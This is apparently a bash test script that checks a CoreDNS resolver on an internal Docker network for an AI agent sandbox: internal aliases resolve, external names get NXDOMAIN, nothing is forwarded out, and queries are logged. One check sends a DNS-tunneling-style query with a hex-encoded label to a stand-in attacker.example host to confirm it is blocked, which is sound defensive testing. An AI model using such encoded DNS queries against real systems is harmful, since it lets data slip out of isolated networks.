#!/bin/bash
# as-dns (CoreDNS, dns/Corefile) answers the *.as.internal aliases of as-net-blind
# through Docker's embedded DNS, NXDOMAIN for everything else, and logs every query.
#
# Builds the networks from .env.example: as-net-blind (internal) with as-dns (the
# hardening from docker-compose.yaml) and containers carrying the compose aliases,
# as-net-litellm-egress (internal) with an alias as-dns must not see, and a normal bridge
# network with a fake resolver that logs what reaches it. as-dns is pointed at that
# resolver (--dns), so any query Docker forwarded out of as-net-blind would show up there.
#
# Needs docker; pulls the CoreDNS and netshoot images.
# Usage: tests/dns/run-dns-tests.sh
set -euo pipefail

REPO=$(cd "$(dirname "$0")/../.." && pwd)
img() { sed -nE "s/.*\\\$\\{$1:-([^}]+)\\}.*/\\1/p" "$REPO/docker-compose.yaml" | head -n1; }
COREDNS=$(img COREDNS_IMAGE)
NETSHOOT=$(img NETSHOOT_IMAGE)
P=as-dns-test-$$
W=$(mktemp -d)
chmod 755 "$W"
cleanup() {
  docker rm -f "$P-dns" "$P-up" "$P-squid" "$P-litellm" "$P-claude" "$P-bridge" "$P-agent" "$P-outside" >/dev/null 2>&1 || true
  docker network rm "$P-blind" "$P-llm" "$P-up" >/dev/null 2>&1 || true
  rm -rf "$W"
}
trap cleanup EXIT

envval() { sed -nE "s/^$1=(.*)/\\1/p" "$REPO/.env.example"; }
for k in BLIND_SUBNET BLIND_IP_RANGE DNS_IP LLM_EGRESS_SUBNET; do declare "$k=$(envval $k)"; done
UP_SUBNET=10.252.53.0/24 UPSTREAM=10.252.53.250

mkdir -p "$W/dns" "$W/up"
cp "$REPO/dns/Corefile" "$W/dns/"
# a local addition through dns/local.d (static name, no forward)
mkdir -p "$W/dns/local.d"
cat >"$W/dns/local.d/lab.conf" <<'EOF'
lab.as.internal {
    hosts {
        192.0.2.20 printer.lab.as.internal
    }
    log
}
EOF
cat >"$W/up/Corefile" <<'EOF'
. {
    template IN A {
        answer "{{ .Name }} 60 IN A 192.0.2.77"
    }
    log
}
EOF
chmod -R a+rX "$W"

FAIL=0
result() { printf '%s  %s\n' "$1" "$2"; [ "$1" = PASS ] || FAIL=$((FAIL + 1)); }

# static: the only server as-dns forwards to is Docker's embedded DNS, for as.internal only
if awk '
  /^[^#[:space:]][^{]*\{[[:space:]]*$/ { inb = 1; zone = $1; b = ""; next }
  inb && /^\}[[:space:]]*$/ {
    if (b ~ /(^|\n)[[:space:]]*(grpc|etcd|kubernetes|secondary|route53|clouddns|azure)[[:space:]]/) bad = 1
    if (b ~ /(^|\n)[[:space:]]*forward[[:space:]]/ &&
        !(zone == "as.internal" && b ~ /(^|\n)[[:space:]]*forward \. 127\.0\.0\.11[[:space:]]*(\n|$)/)) bad = 1
    inb = 0; next
  }
  inb { b = b $0 "\n" }
  END { exit bad }' "$REPO/dns/Corefile"; then
  result PASS "only as.internal is forwarded, and only to 127.0.0.11"
else
  result FAIL "only as.internal is forwarded, and only to 127.0.0.11"
fi

docker network create --internal --subnet "$BLIND_SUBNET" --ip-range "$BLIND_IP_RANGE" "$P-blind" >/dev/null
docker network create --internal --subnet "$LLM_EGRESS_SUBNET" "$P-llm" >/dev/null
docker network create --subnet "$UP_SUBNET" "$P-up" >/dev/null
docker run -d --name "$P-up" --network "$P-up" --ip "$UPSTREAM" -v "$W/up:/etc/coredns:ro" \
  "$COREDNS" -conf /etc/coredns/Corefile >/dev/null
docker run -d --name "$P-dns" --network "$P-blind" --ip "$DNS_IP" --network-alias dns.as.internal \
  --dns "$UPSTREAM" --read-only --cap-drop ALL --cap-add NET_BIND_SERVICE \
  --security-opt no-new-privileges:true \
  -v "$W/dns:/etc/coredns:ro" "$COREDNS" -conf /etc/coredns/Corefile >/dev/null
# the aliases from docker-compose.yaml (Squid also has one on as-net-litellm-egress)
docker create --name "$P-squid" --network "$P-blind" --network-alias proxy.as.internal \
  "$NETSHOOT" sleep infinity >/dev/null
docker network connect --alias llm-proxy.as.internal "$P-llm" "$P-squid"
docker start "$P-squid" >/dev/null
docker run -d --name "$P-litellm" --network "$P-blind" --network-alias litellm.as.internal \
  "$NETSHOOT" sleep infinity >/dev/null
docker run -d --name "$P-claude" --network "$P-blind" --network-alias claude.as.internal \
  --network-alias dev-ws01.as.internal "$NETSHOOT" sleep infinity >/dev/null
docker run -d --name "$P-bridge" --network "$P-blind" --network-alias claude-bridge.as.internal \
  "$NETSHOOT" sleep infinity >/dev/null
docker run -d --name "$P-agent" --network "$P-blind" "$NETSHOOT" sleep infinity >/dev/null
# a container on as-net-blind that asks the outside resolver itself (Docker's DNS must not forward)
docker run -d --name "$P-outside" --network "$P-blind" --dns "$UPSTREAM" "$NETSHOOT" sleep infinity >/dev/null

ip_of() { docker inspect -f "{{(index .NetworkSettings.Networks \"$P-blind\").IPAddress}}" "$P-$1"; }
AGENT_IP=$(ip_of agent)
dq() { docker exec "$P-$1" dig @"$DNS_IP" +time=2 +tries=1 "${@:2}"; }
for _ in $(seq 1 50); do
  [ -n "$(dq agent +short dns.as.internal 2>/dev/null || true)" ] && break
  sleep 0.2
done
status() { dq "$@" +comments | sed -nE 's/.*status: ([A-Z]+).*/\1/p'; }
expect_a() { # expect_a <name> <ip>
  local got
  got=$(dq agent +short "$1")
  if [ "$got" = "$2" ]; then result PASS "A $1 = $2"; else result FAIL "A $1 = $2 (got '${got}')"; fi
}
expect_status() { # expect_status <status regex> <description> <dig args...>
  local want=$1 what=$2 got
  shift 2
  got=$(status agent "$@")
  if [[ $got =~ ^($want)$ ]]; then result PASS "$what: $got"; else result FAIL "$what: $want (got '${got}')"; fi
}

expect_a dns.as.internal "$DNS_IP"
expect_a proxy.as.internal "$(ip_of squid)"
expect_a litellm.as.internal "$(ip_of litellm)"
for n in claude dev-ws01; do expect_a $n.as.internal "$(ip_of claude)"; done
expect_a claude-bridge.as.internal "$(ip_of bridge)"
expect_a PROXY.AS.INTERNAL "$(ip_of squid)"
expect_a printer.lab.as.internal 192.0.2.20   # dns/local.d import
case $(ip_of litellm) in "${BLIND_IP_RANGE%.*}".*) result PASS "Docker assigns from BLIND_IP_RANGE" ;;
  *) result FAIL "Docker assigns from BLIND_IP_RANGE (got $(ip_of litellm))" ;; esac
expect_status 'NOERROR' "AAAA of a known name" AAAA proxy.as.internal
expect_status 'NXDOMAIN|SERVFAIL' "alias on another network (llm-proxy)" llm-proxy.as.internal
expect_status 'NXDOMAIN|SERVFAIL' "unknown name in as.internal" leak-unknown-as.as.internal
expect_status 'NXDOMAIN|SERVFAIL' "bare container name (no alias)" "$P-agent"
expect_status 'NXDOMAIN' "external name" agent-query.example.com
expect_status 'NXDOMAIN' "tunneling-style external name" 6578666c74726174696f6e.attacker.example
expect_status 'NXDOMAIN' "external name over TCP" +tcp agent-tcp.example.com
expect_status 'NXDOMAIN' "TXT query" TXT agent-txt.example.com
# control: the same query from a normal network does reach the outside resolver
if [ "$(docker run --rm --network "$P-up" --dns "$UPSTREAM" "$NETSHOOT" dig +time=2 +tries=1 +short control.example.com)" = 192.0.2.77 ]; then
  result PASS "control: a normal network reaches the outside resolver"
else
  result FAIL "control: a normal network reaches the outside resolver"
fi
if [ -n "$(docker exec "$P-outside" dig +time=2 +tries=1 +short leak-direct.example.com || true)" ]; then
  result FAIL "Docker's DNS on as-net-blind forwards nothing outside"
else
  result PASS "Docker's DNS on as-net-blind forwards nothing outside"
fi

sleep 1
up=$(docker logs "$P-up" 2>&1)
dnslog=$(docker logs "$P-dns" 2>&1)
if ! grep -q 'control.example.com' <<<"$up"; then
  result FAIL "outside resolver logs queries (control)"
elif grep -qE 'leak-|agent-|6578666c74726174696f6e' <<<"$up"; then
  result FAIL "no query reached the outside resolver"
else
  result PASS "no query reached the outside resolver"
fi
if grep -q "$AGENT_IP:.*6578666c74726174696f6e.attacker.example" <<<"$dnslog" &&
   grep -q "$AGENT_IP:.*litellm.as.internal" <<<"$dnslog"; then
  result PASS "as-dns logged internal and external queries with the source address"
else
  result FAIL "as-dns logged internal and external queries with the source address"
fi

if [ "$FAIL" -gt 0 ]; then
  echo "--- as-dns log"; tail -20 <<<"$dnslog"
  echo "--- outside resolver log"; tail -20 <<<"$up"
  echo "run-dns-tests: $FAIL check(s) failed" >&2
  exit 1
fi
echo "run-dns-tests: all checks passed"
